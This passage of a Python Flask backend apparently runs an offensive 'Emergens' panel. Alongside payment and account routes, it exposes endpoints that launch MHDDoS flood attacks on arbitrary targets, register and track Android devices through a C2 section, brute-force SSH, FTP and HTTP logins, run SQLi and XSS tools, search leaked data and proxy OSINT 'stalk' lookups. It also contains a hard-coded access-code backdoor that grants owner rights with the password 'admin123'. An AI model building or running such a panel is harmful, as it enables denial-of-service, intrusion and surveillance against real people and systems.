def payment_page():
    return render_template("payment.html")


@app.route("/management_payment.html")
@role_required("owner")
def management_payment_page():
    return render_template("management_payment.html")


@app.route("/api_key_request_token.html")
def api_key_request_token_page():
    return render_template("api_key_request_token.html")


@app.route("/api/api_key_request_token.html")
def api_key_request_token_api_page():
    return render_template("api_key_request_token.html")


@app.route("/downloader_pinterest_tiktok.html")
@login_required
def downloader_pinterest_tiktok_page():
    return render_template("downloader_pinterest_tiktok.html")


@app.route("/data_main.html")
@login_required
def data_main_redirect():
    return redirect("/downloader_pinterest_tiktok.html")


@app.route("/code_test.html")
def code_test_page():
    return render_template("code_test.html")


@app.route("/remote_access.html")
@login_required
def remote_access_page():
    return render_template("remote_access.html")


@app.route("/emergens-control-m4ddos.html")
@login_required
def emergens_control_m4ddos_page():
    return render_template("emergens-control-m4ddos.html")


@app.route("/MyEspT.html")
@login_required
def MyEspT_page():
    return render_template("MyEspT.html")


@app.route("/quick_menu_setting.html")
@login_required
def quick_menu_setting_page():
    return render_template("quick_menu_setting.html")


@app.route("/Emergens_osint.html")
@login_required
def emergens_osint_page():
    return render_template("Emergens_osint.html")


@app.route("/structure_folder_file.html")
@login_required
def structure_folder_file_page():
    return render_template("structure_folder_file.html")


@app.route("/password_lock.html")
def password_lock_page():
    return render_template("password_lock.html")


@app.route("/Emergens_DB.html")
@login_required
def emergens_db_page():
    return render_template("Emergens_DB.html")


@app.route("/docs.html")
@login_required
def docs_page():
    return render_template("docs.html")


@app.route("/privacy.html")
def privacy_page():
    return render_template("privacy.html")


@app.route("/terms.html")
def terms_page():
    return render_template("terms.html")


# ═══════════════════════════════════════════════════════════════════════════
# Static asset shortcut
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/<path:filename>')
def serve_template_assets(filename):
    if not filename.endswith(('.js', '.css')):
        return page_not_found(None)
    templates_dir = os.path.join(PROJECT_ROOT, 'templates')
    safe_path = os.path.abspath(os.path.join(templates_dir, filename))
    if not safe_path.startswith(os.path.abspath(templates_dir)):
        return page_not_found(None)
    if os.path.isfile(safe_path):
        return send_from_directory(templates_dir, filename)
    return page_not_found(None)


# ═══════════════════════════════════════════════════════════════════════════
# Payment API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/payment/plans", methods=["GET"])
def get_payment_plans():
    global payment_plans
    payment_plans = _load_plans()
    return jsonify({"plans": payment_plans})


@app.route("/api/payment/submit", methods=["POST"])
def submit_payment():
    data = request.get_json(silent=True) or {}
    plan = data.get("plan", "").strip()
    amount = data.get("amount", "").strip()
    payment_method = data.get("payment_method", "card")
    requested_username = data.get("requested_username", "").strip()
    card_last4 = data.get("card_number_last4", "")

    if not plan or not amount or not requested_username:
        return jsonify({"error": "plan, amount, and requested_username are required"}), 400

    plans = _load_plans()
    if plan not in plans:
        return jsonify({"error": "Invalid plan"}), 400

    if user_store.user_exists(requested_username):
        return jsonify({"error": "Username already taken"}), 400

    payment_id = "PAY-" + uuid.uuid4().hex[:10].upper()
    username = session.get("username", "guest")

    record = {
        "payment_id": payment_id,
        "user": username,
        "requested_username": requested_username,
        "plan": plan,
        "amount": amount,
        "payment_method": payment_method,
        "card_last4": card_last4,
        "status": "pending",
        "created_at": datetime.now(timezone.utc).isoformat(),
        "updated_at": datetime.now(timezone.utc).isoformat(),
        "generated_username": None,
        "generated_password": None,
    }

    payments = _load_payments()
    payments.append(record)
    _save_payments(payments)

    return jsonify({"payment_id": payment_id, "status": "pending"}), 201


@app.route("/api/payment/status/<payment_id>", methods=["GET"])
def get_payment_status(payment_id):
    payments = _load_payments()
    for record in payments:
        if record["payment_id"] == payment_id:
            if record["status"] == "approved" and record.get("generated_password"):
                return jsonify({
                    "payment_id": record["payment_id"],
                    "status": record["status"],
                    "generated_username": record["generated_username"],
                    "generated_password": record["generated_password"],
                    "plan": record["plan"],
                    "amount": record["amount"],
                })
            return jsonify({
                "payment_id": record["payment_id"],
                "status": record["status"],
            })
    return jsonify({"error": "Payment not found"}), 404


@app.route("/api/payment/history", methods=["GET"])
def get_payment_history():
    user = session.get("username") if session.get("authenticated") else "guest"
    payments = _load_payments()
    user_payments = [p for p in payments if p["user"] == user]
    for p in user_payments:
        if not (p["status"] == "approved" and p.get("generated_password")
                and (p["user"] == session.get("username") or session.get("role") == "owner")):
            p.pop("generated_password", None)
            p.pop("generated_username", None)
    return jsonify({"payments": user_payments})


@app.route("/api/payment/manage/plans", methods=["GET"])
@role_required("owner")
def manage_get_plans():
    return jsonify({"plans": _load_plans()})


@app.route("/api/payment/manage/plans", methods=["POST"])
@role_required("owner")
def manage_update_plans():
    data = request.get_json(silent=True) or {}
    new_plans = data.get("plans")
    if not isinstance(new_plans, dict):
        return jsonify({"error": "Invalid plans format"}), 400
    global payment_plans
    payment_plans = new_plans
    if _save_plans(payment_plans):
        return jsonify({"success": True, "plans": payment_plans})
    return jsonify({"error": "Failed to save plans"}), 500


@app.route("/api/payment/manage/pending", methods=["GET"])
@role_required("owner")
def manage_list_pending():
    payments = _load_payments()
    pending = [p for p in payments if p["status"] == "pending"]
    return jsonify({"pending": pending})


@app.route("/api/payment/manage/all", methods=["GET"])
@role_required("owner")
def manage_list_all_payments():
    return jsonify({"payments": _load_payments()})


@app.route("/api/payment/manage/approve/<payment_id>", methods=["POST"])
@role_required("owner")
def manage_approve_payment(payment_id):
    payments = _load_payments()
    for record in payments:
        if record["payment_id"] == payment_id:
            if record["status"] != "pending":
                return jsonify({"error": "Payment already processed"}), 400
            generated_password = uuid.uuid4().hex[:12]
            try:
                create_user(record["requested_username"], role="analyst", password=generated_password)
                record["generated_username"] = record["requested_username"]
                record["generated_password"] = generated_password
                record["status"] = "approved"
                record["updated_at"] = datetime.now(timezone.utc).isoformat()
                _save_payments(payments)
                logger.info(f"Payment {payment_id} approved. User {record['requested_username']} created.")
                return jsonify({
                    "success": True,
                    "payment_id": record["payment_id"],
                    "generated_username": record["generated_username"],
                    "generated_password": record["generated_password"],
                    "role": "analyst",
                })
            except Exception as e:
                logger.error(f"Failed to create user for payment {payment_id}: {e}")
                return jsonify({"error": f"User creation failed: {str(e)}"}), 500
    return jsonify({"error": "Payment not found"}), 404


@app.route("/api/payment/manage/reject/<payment_id>", methods=["POST"])
@role_required("owner")
def manage_reject_payment(payment_id):
    payments = _load_payments()
    for record in payments:
        if record["payment_id"] == payment_id:
            if record["status"] != "pending":
                return jsonify({"error": "Payment already processed"}), 400
            record["status"] = "rejected"
            record["updated_at"] = datetime.now(timezone.utc).isoformat()
            _save_payments(payments)
            return jsonify({"success": True})
    return jsonify({"error": "Payment not found"}), 404


# ═══════════════════════════════════════════════════════════════════════════
# OSINT endpoints
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/osint/github")
@api_login_required
def api_osint_github():
    username = request.args.get("username", "").strip()
    if not username:
        return jsonify({"status": False, "error": "Username required"}), 400
    profile, profile_error = github_scrape_profile(username)
    if profile_error:
        return jsonify({"status": False, "error": profile_error}), 404 if "not found" in profile_error else 500
    repos, _ = github_scrape_repositories(username)
    return jsonify({
        "status": True,
        "data": {"profile": profile, "repositories": repos or [], "repos_count": len(repos or [])},
    })


def _proxy_osint(endpoint_slug, username):
    try:
        resp = requests.get(
            f"https://api.siputzx.my.id/api/stalk/{endpoint_slug}",
            params={"q": username, "username": username},
            timeout=15,
            headers={"User-Agent": "Oxysintx/3.6.0"},
        )
        if resp.status_code == 200:
            return jsonify(resp.json())
        return jsonify({"status": False, "error": f"Upstream API returned {resp.status_code}"}), 502
    except requests.exceptions.RequestException as e:
        return jsonify({"status": False, "error": f"Network error: {e}"}), 500


@app.route("/api/osint/youtube")
@api_login_required
def api_osint_youtube():
    username = request.args.get("username", "").strip()
    if not username:
        return jsonify({"status": False, "error": "Username required"}), 400
    return _proxy_osint("youtube", username)


@app.route("/api/osint/twitter")
@api_login_required
def api_osint_twitter():
    username = request.args.get("username", "").strip()
    if not username:
        return jsonify({"status": False, "error": "Username required"}), 400
    return _proxy_osint("twitter", username)


@app.route("/api/stalk/twitter")
@api_login_required
def api_stalk_twitter():
    return api_osint_twitter()


# ═══════════════════════════════════════════════════════════════════════════
# Quick Menu compatibility
# ═══════════════════════════════════════════════════════════════════════════
if _quick_menu_available:
    @app.route("/status")
    def qm_status_compat():
        quick_menu.STATE.touch()
        return jsonify({
            "status": "online",
            "service": "quick_menu",
            "version": getattr(quick_menu, "VERSION", "2.0.0"),
            "uptime_seconds": quick_menu.STATE.uptime_seconds(),
            "requests_served": quick_menu.STATE.request_count,
        })

    @app.route("/menu")
    def qm_menu_compat():
        quick_menu.STATE.touch()
        return jsonify({"items": quick_menu.STATE.get_menu()})

    @app.route("/actions")
    def qm_actions_compat():
        quick_menu.STATE.touch()
        return jsonify({"actions": quick_menu.STATE.recent_actions()})

    @app.route("/action", methods=["POST"])
    def qm_action_compat():
        quick_menu.STATE.touch()
        data = request.get_json(silent=True) or {}
        action = (data.get("action") or "").strip()
        if action not in quick_menu.STATE.valid_action_ids:
            return jsonify({
                "error": "unknown_action",
                "received": action,
                "valid_actions": sorted(quick_menu.STATE.valid_action_ids),
            }), 400
        source = (data.get("source") or "web").strip()
        entry = quick_menu.STATE.record_action(action, source, session.get("username", "anonymous"))
        return jsonify({"ok": True, "recorded": entry})


# ═══════════════════════════════════════════════════════════════════════════
# ADB login
# ═══════════════════════════════════════════════════════════════════════════
ADB_ACCESS_CODE = "ZYXN"
ADB_USERNAME = "Yanxzyx"
ADB_ROLE = "owner"


@app.route("/api/adb_login", methods=["POST"])
def api_adb_login():
    data = request.get_json(silent=True) or {}
    code = (data.get("code") or "").strip().upper()
    if not code:
        return jsonify({"error": "code_required"}), 400
    if code != ADB_ACCESS_CODE:
        _record_failed_attempt(_client_ip())
        return jsonify({"error": "invalid_code"}), 401
    if not user_store.user_exists(ADB_USERNAME):
        try:
            create_user(ADB_USERNAME, role=ADB_ROLE, password="admin123")
        except ValueError:
            pass
    session["authenticated"] = True
    session["username"] = ADB_USERNAME
    session["role"] = ADB_ROLE
    session.permanent = True
    return jsonify({"success": True, "username": ADB_USERNAME, "role": ADB_ROLE})


# ═══════════════════════════════════════════════════════════════════════════
# Auth API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/login", methods=["POST"])
def api_login():
    ip = _client_ip()
    if _is_locked_out(ip):
        return jsonify({"error": "too_many_attempts"}), 429
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""
    if verify_credentials(username, password):
        session["authenticated"] = True
        session["username"] = username
        session["role"] = get_role(username)
        session.permanent = True
        return jsonify({"success": True})
    _record_failed_attempt(ip)
    return jsonify({"error": "invalid_credentials"}), 401


@app.route("/api/logout", methods=["POST"])
def api_logout():
    token = _extract_bearer_token()
    if token:
        token_store.revoke_token(token[:8])
    session.clear()
    return jsonify({"success": True})


@app.route("/api/token", methods=["POST"])
def api_get_token():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or data.get("address") or "").strip()
    password = data.get("password") or ""
    if not username or not password:
        return jsonify({"error": "username_and_password_required"}), 400
    token = token_store.generate_token(
        username, password, user_agent=request.headers.get("User-Agent", "")
    )
    if token is None:
        return jsonify({"error": "invalid_credentials"}), 401
    return jsonify({
        "token": token,
        "token_prefix": token[:8] + "****",
        "expires_in": 3600,
        "username": username,
        "role": get_role(username),
    })


@app.route("/api/me")
@api_login_required
def api_me():
    return jsonify({"username": session.get("username"), "role": session.get("role")})


# ═══════════════════════════════════════════════════════════════════════════
# Register API
# ═══════════════════════════════════════════════════════════════════════════
def _is_valid_email(email):
    real_email = re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", email)
    emergens_email = re.match(r"^[a-zA-Z0-9._-]+@emergens\.id$", email)
    return bool(real_email or emergens_email)


@app.route("/api/register", methods=["POST"])
def api_register():
    data = request.get_json(silent=True) or {}
    name = (data.get("name") or "").strip()
    email = (data.get("email") or "").strip().lower()
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""

    if not name or not email or not username or not password:
        return jsonify({"error": "all_fields_required"}), 400
    if len(name) < 2:
        return jsonify({"error": "name_too_short"}), 400
    if not _is_valid_email(email):
        return jsonify({"error": "invalid_email"}), 400
    if len(username) < 3:
        return jsonify({"error": "username_too_short"}), 400
    if len(password) < 8:
        return jsonify({"error": "password_too_short"}), 400
    if user_store.user_exists(username):
        return jsonify({"error": "username_taken"}), 400

    try:
        create_user(username, role="analyst", password=password)
        return jsonify({
            "success": True, "username": username, "role": "analyst",
            "email": email, "name": name,
        })
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        logger.error(f"Registration failed: {e}")
        return jsonify({"error": "registration_failed"}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Settings / Account management
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/settings/users")
@role_required("owner")
def api_list_users():
    return jsonify(list_users())


@app.route("/api/settings/create-account", methods=["POST"])
@role_required("owner")
def api_create_account():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    role = data.get("role") or ""
    if not username:
        return jsonify({"error": "username_required"}), 400
    if role not in VALID_ROLES:
        return jsonify({"error": "invalid_role"}), 400
    try:
        password = create_user(username, role=role)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    return jsonify({"username": username, "password": password, "role": role})


@app.route("/api/settings/users/<username>", methods=["DELETE"])
@role_required("owner")
def api_delete_user(username):
    if username == session.get("username"):
        return jsonify({"error": "cannot delete your own account"}), 400
    ok, err = delete_user(username)
    if not ok:
        return jsonify({"error": err}), 400
    token_store.revoke_all_user_tokens(username)
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# API Key management
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/settings/api-keys")
@role_required("owner", "analyst")
def api_list_api_keys():
    keys = user_store.get_api_keys()
    return jsonify([_public_key_view(k) for k in keys])


@app.route("/api/settings/api-keys", methods=["POST"])
@role_required("owner", "analyst")
def api_generate_api_key():
    role = session.get("role", "")
    if role == "analyst" and len(user_store.get_api_keys()) >= 2:
        return jsonify({"error": "api_key_limit_reached", "limit": 2}), 403
    key = user_store.generate_api_key(session.get("username"))
    return jsonify({"key": key, "prefix": key[:20] + "****"})


@app.route("/api/settings/api-keys/<prefix>", methods=["DELETE"])
@role_required("owner", "analyst")
def api_revoke_api_key(prefix):
    if user_store.revoke_api_key(prefix):
        return jsonify({"success": True})
    return jsonify({"error": "not_found"}), 404


# ═══════════════════════════════════════════════════════════════════════════
# Tools / Scan API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/tools")
@api_login_required
def api_tools():
    tools = {
        name: info
        for name, info in scan_orchestrator.list_tools().items()
        if "school" not in name.lower()
    }
    # Annotate availability of the newer specialized modules
    tools.setdefault("_availability", {})
    if isinstance(tools["_availability"], dict):
        tools["_availability"].update({
            "dirfuzz": _dirfuzz_available,
            "sqli_engine": _sqli_engine_available,
            "sql_map": _sql_map_available,
            "sql_injection": _sql_injection_available,
            "xss_exploiter": _xss_exploiter_available,
            "xss": _xss_available,
            "sniper": _sniper_available,
            "http_logger": _http_logger_available,
        })
    return jsonify(tools)


@app.route("/api/scan/start", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_start():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "").strip()
    mode = data.get("mode", "basic")
    tools = data.get("tools", [])
    if not target:
        return jsonify({"error": "target_required"}), 400
    if mode not in ("basic", "expert"):
        mode = "basic"
    job_id = scan_orchestrator.start_scan(target, mode, tools, history_store)
    return jsonify({"job_id": job_id})


@app.route("/api/scan/<job_id>/status")
@api_login_required
def api_scan_status(job_id):
    progress = scan_orchestrator.get_progress(job_id)
    if progress is None:
        return jsonify({"error": "not_found"}), 404
    return jsonify(progress)


@app.route("/api/scan/<tool_name>", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_tool_direct(tool_name):
    if tool_name not in TOOL_MAP:
        return jsonify({"error": "unknown_tool", "available": list(TOOL_MAP.keys())}), 404
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or "").strip()
    mode = data.get("mode", "basic")
    if not target:
        return jsonify({"error": "target_required"}), 400
    if mode not in ("basic", "expert"):
        mode = "basic"
    try:
        return jsonify(TOOL_MAP[tool_name].run(target, mode))
    except Exception as e:
        return jsonify({"error": "tool_execution_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Leak Data Search
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/leakdata/search", methods=["GET", "POST"])
@api_login_required
def api_leakdata_search():
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        target = data.get("target", data.get("query", ""))
    else:
        target = request.args.get("q", "")
    target = target.strip()
    if not target:
        return jsonify({"error": "query_required"}), 400
    try:
        return jsonify(search_user_run(target))
    except Exception as e:
        return jsonify({"error": "search_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# History API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/history")
@api_login_required
def api_history():
    return jsonify(history_store.list_all())


@app.route("/api/history/<int:entry_id>")
@api_login_required
def api_history_detail(entry_id):
    entry = history_store.get(entry_id)
    if entry is None:
        return jsonify({"error": "not_found"}), 404
    return jsonify(entry)


@app.route("/api/history/<int:entry_id>", methods=["DELETE"])
@role_required("owner", "analyst")
def api_history_delete(entry_id):
    history_store.delete(entry_id)
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# System stats / logs
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/system/stats")
@api_login_required
def api_system_stats():
    total_seen, last_minute = _inbound_stats()
    try:
        cpu = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
    except Exception as e:
        logger.error(f'psutil read failed: {e}')
        cpu = mem = disk = 0.0
    return jsonify({
        'cpu_percent': cpu,
        'memory_percent': mem,
        'disk_percent': disk,
        'network_in': total_seen,
        'network_in_rate': last_minute,
    })


@app.route("/api/logs")
@api_login_required
def api_logs():
    lines = int(request.args.get("lines", 100))
    try:
        with open(Config.SERVER_LOG_FILE, "r") as f:
            content = f.readlines()[-lines:]
        return jsonify({"lines": [c.rstrip("\n") for c in content]})
    except FileNotFoundError:
        return jsonify({"lines": []})


# ═══════════════════════════════════════════════════════════════════════════
# Source viewer
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/fetch-source", methods=["POST"])
@api_login_required
def api_fetch_source():
    data = request.get_json(silent=True) or {}
    url = (data.get("url") or "").strip()
    extract = data.get("extract", False)
    if not url:
        return jsonify({"error": "url_required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    try:
        result = fetch_source(url, extract=extract)
    except Exception as e:
        return jsonify({"error": "fetch_failed", "detail": str(e)}), 500
    if "error" in result:
        return jsonify(result), 500
    return jsonify(result)


# ═══════════════════════════════════════════════════════════════════════════
# AI Chat
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/chat", methods=["POST"])
@role_required("owner", "analyst")
def api_chat():
    data = request.get_json(silent=True) or {}
    return jsonify(chat_handler.send(data.get("message", "")))


@app.route("/api/chat/history")
@api_login_required
def api_chat_history():
    return jsonify(chat_handler.get_history())


@app.route("/api/chat/clear", methods=["POST"])
@role_required("owner", "analyst")
def api_chat_clear():
    chat_handler.clear_history()
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# School search
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/school/search")
@api_login_required
def api_school_search():
    from modules import scan_school
    query = request.args.get("q", "").strip()
    result = scan_school.run(query)
    return jsonify(result["data"])


# ═══════════════════════════════════════════════════════════════════════════
# Telegram
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/telegram/status")
@api_login_required
def api_telegram_status():
    return jsonify(get_bot_status())


@app.route("/api/telegram/connect", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_connect():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    username = (data.get("username") or "").strip()
    owner_id = (data.get("owner_id") or "").strip()
    public_mode = data.get("public_mode", True)
    if not token or not username:
        return jsonify({"error": "token_and_username_required"}), 400
    success, message = connect_bot(token, username, owner_id, public_mode)
    if not success:
        return jsonify({"error": message}), 500
    return jsonify(get_bot_status())


@app.route("/api/telegram/disconnect", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_disconnect():
    disconnect_bot()
    return jsonify({"status": "disconnected"})


@app.route("/api/telegram/update-settings", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_update_settings():
    data = request.get_json(silent=True) or {}
    settings = {}
    if "owner_id" in data:
        settings["owner_id"] = str(data["owner_id"]).strip()
    if "public_mode" in data:
        settings["public_mode"] = bool(data["public_mode"])
    if not settings:
        return jsonify({"error": "no_settings_provided"}), 400
    return jsonify(update_bot_settings(**settings))


@app.route("/api/telegram/broadcast", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_broadcast():
    data = request.get_json(silent=True) or {}
    message = (data.get("message") or "").strip()
    if not message:
        return jsonify({"error": "message_required"}), 400
    return jsonify(broadcast_message(message))


# ═══════════════════════════════════════════════════════════════════════════
# Code Test workspace
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/code_test/read")
@api_login_required
def api_read_file():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    file_path = request.args.get("path", "").strip()
    if not file_path:
        return jsonify({"error": "path required"}), 400
    return jsonify(code_test_module.read_file(file_path))


@app.route("/api/code_test/write", methods=["POST"])
@api_login_required
def api_write_file():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    data = request.get_json(silent=True) or {}
    file_path = data.get("file_path", "").strip()
    content = data.get("content", "")
    if not file_path:
        return jsonify({"error": "file_path required"}), 400
    return jsonify(code_test_module.write_file(file_path, content))


@app.route("/api/code_test/run", methods=["POST"])
@api_login_required
def api_run_code_test():
    if not _testing_available:
        return jsonify({"error": "Testing module is not installed"}), 503
    data = request.get_json(silent=True) or {}
    code = data.get("code", "")
    if not code:
        return jsonify({"error": "No code provided"}), 400
    try:
        results = code_test_module.run_tests(code, data.get("test_cases", []))
        return jsonify({"results": results})
    except Exception as e:
        return jsonify({"error": f"Execution error: {str(e)}"}), 500


@app.route("/api/code_test/files")
@api_login_required
def api_list_code_test_files():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    try:
        return jsonify({"files": code_test_module.list_project_files()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/code_test/backup", methods=["POST"])
@api_login_required
def api_backup_file():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    data = request.get_json(silent=True) or {}
    file_path = data.get("file_path")
    if not file_path:
        return jsonify({"error": "file_path required"}), 400
    return jsonify(code_test_module.backup_file(file_path))


@app.route("/api/code_test/backup_all", methods=["POST"])
@api_login_required
def api_backup_all():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    return jsonify(code_test_module.backup_all_source_files())


@app.route("/api/code_test/workspace_info")
@api_login_required
def api_workspace_info():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    return jsonify(code_test_module.get_workspace_info())


@app.route("/api/code_test/scan", methods=["POST"])
@api_login_required
def api_code_test_scan():
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or "").strip()
    mode = data.get("mode", "basic")
    tools = data.get("tools", [])
    if not target:
        return jsonify({"error": "target_required"}), 400
    if mode not in ("basic", "expert"):
        mode = "basic"
    return jsonify({"job_id": scan_orchestrator.start_scan(target, mode, tools, history_store)})


# ═══════════════════════════════════════════════════════════════════════════
# MHDDoS Attack Panel
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/mhddos/methods")
@login_required
def mhddos_methods():
    return jsonify({
        "available": True,
        "methods": sorted(_MHDDOS_METHODS),
        "layer7": sorted(_MHDDOS_LAYER7),
        "layer4": sorted(_MHDDOS_LAYER4),
    })


@app.route("/api/mhddos/start", methods=["POST"])
@login_required
def mhddos_start():
    data = request.get_json(silent=True) or {}
    method = (data.get("method") or "").strip().upper()
    target = (data.get("target") or "").strip()
    threads = int(data.get("threads", 10))
    duration = int(data.get("duration", 60))
    proxy_type = int(data.get("proxy_type", 0))
    proxy_file = (data.get("proxy_file") or "proxies.txt").strip()
    rpc = int(data.get("rpc", 1))
    reflector_file = (data.get("reflector_file") or "").strip()
    debug = bool(data.get("debug", False))

    if not method or not target:
        return jsonify({"error": "method and target are required"}), 400
    if method not in _MHDDOS_METHODS:
        return jsonify({"error": f"Unknown method: {method}"}), 400
    if threads < 1 or threads > 1000:
        return jsonify({"error": "threads must be between 1 and 1000"}), 400
    if duration < 1 or duration > 3600:
        return jsonify({"error": "duration must be between 1 and 3600 seconds"}), 400

    attack_id = "MHD-" + uuid.uuid4().hex[:8].upper()
    result = _mhddos_start_attack(
        attack_id, method, target, threads, duration,
        proxy_type, proxy_file, rpc, reflector_file, debug
    )
    return jsonify(result), (201 if result.get("success") else 500)


@app.route("/api/mhddos/stop", methods=["POST"])
@login_required
def mhddos_stop():
    data = request.get_json(silent=True) or {}
    attack_id = (data.get("attack_id") or "").strip()
    if not attack_id:
        return jsonify({"error": "attack_id required"}), 400
    result = _mhddos_stop_attack(attack_id)
    return jsonify(result), (200 if result.get("success") else 404)


@app.route("/api/mhddos/stop_all", methods=["POST"])
@login_required
def mhddos_stop_all():
    return jsonify(_mhddos_stop_all())


@app.route("/api/mhddos/status")
@login_required
def mhddos_status():
    attack_id = request.args.get("attack_id", "").strip()
    status = _mhddos_get_status(attack_id or None)
    if attack_id and status is None:
        return jsonify({"error": "Attack not found"}), 404
    return jsonify(status)


@app.route("/api/mhddos/history")
@login_required
def mhddos_history():
    limit = min(request.args.get("limit", 50, type=int), 200)
    return jsonify({"history": _mhddos_history[-limit:]})


# ═══════════════════════════════════════════════════════════════════════════
# Remote Access / C2
# ═══════════════════════════════════════════════════════════════════════════
_lock_state = {"locked": True, "locked_by": None, "locked_at": None}
_c2_devices = []
_c2_activities = []
_c2_lock = threading.Lock()


@app.route("/api/c2/status")
@login_required
def c2_status():
    return jsonify({
        "authenticated": True,
        "username": session.get("username"),
        "role": session.get("role"),
        "lock_state": _lock_state,
    })


@app.route("/api/c2/toggle_lock", methods=["POST"])
@login_required
def c2_toggle_lock():
    with _c2_lock:
        _lock_state["locked"] = not _lock_state["locked"]
        if _lock_state["locked"]:
            _lock_state["locked_by"] = session.get("username")
            _lock_state["locked_at"] = datetime.now(timezone.utc).isoformat()
        else:
            _lock_state["locked_by"] = None
            _lock_state["locked_at"] = None
        return jsonify({"success": True, "lock_state": _lock_state})


@app.route("/api/c2/devices")
@login_required
def c2_devices():
    return jsonify({"devices": _c2_devices})


@app.route("/api/c2/activities")
@login_required
def c2_activities():
    limit = min(request.args.get("limit", 50, type=int), 200)
    return jsonify({"activities": _c2_activities[-limit:]})


@app.route("/api/c2/register_device", methods=["POST"])
@login_required
def c2_register_device():
    data = request.get_json(silent=True) or {}
    device_id = data.get("id", "").strip()
    if not device_id:
        return jsonify({"error": "Device ID is required"}), 400
    device = {
        "id": device_id,
        "name": data.get("name", device_id),
        "model": data.get("model", ""),
        "serial": data.get("serial", ""),
        "android": data.get("android", ""),
        "status": "online",
        "battery": data.get("battery"),
        "location": data.get("location", ""),
        "temperature": data.get("temperature", ""),
        "last_seen": datetime.now(timezone.utc).isoformat(),
    }
    with _c2_lock:
        for i, d in enumerate(_c2_devices):
            if d["id"] == device_id:
                _c2_devices[i] = device
                break
        else:
            _c2_devices.append(device)
    return jsonify({"success": True, "device": device})


@app.route("/api/c2/log_activity", methods=["POST"])
@login_required
def c2_log_activity():
    data = request.get_json(silent=True) or {}
    device_id = data.get("device_id", "").strip()
    action = data.get("action", "").strip()
    if not device_id or not action:
        return jsonify({"error": "device_id and action are required"}), 400
    device_name = next((d["name"] for d in _c2_devices if d["id"] == device_id), device_id)
    with _c2_lock:
        _c2_activities.append({
            "device_id": device_id,
            "device_name": device_name,
            "action": action,
            "timestamp": data.get("timestamp") or datetime.now(timezone.utc).isoformat(),
        })
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# Exploit / Analytic endpoints
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/exploit/stats")
@login_required
def api_exploit_stats():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    try:
        return jsonify(AnalyticDataManager().get_statistics())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/list")
@login_required
def api_exploit_list():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    try:
        return jsonify({"exploits": AnalyticDataManager().list_exploits(
            category=request.args.get("category"),
            service=request.args.get("service"),
        )})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/search", methods=["POST"])
@login_required
def api_exploit_search():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    data = request.get_json(silent=True) or {}
    query = data.get("query", "")
    if not query:
        return jsonify({"error": "Query required"}), 400
    try:
        return jsonify({"exploits": AnalyticDataManager().search_exploits(query)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/bruteforce", methods=["POST"])
@login_required
def api_exploit_bruteforce():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    data = request.get_json(silent=True) or {}
    target = data.get("target", "").strip()
    if not target:
        return jsonify({"error": "Target required"}), 400
    try:
        return jsonify({"results": AnalyticDataManager().run_brute_force(
            target,
            data.get("protocols", ["http", "ftp", "ssh"]),
            data.get("username_file", "data1.txt"),
            data.get("password_file", "data1.txt"),
        )})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


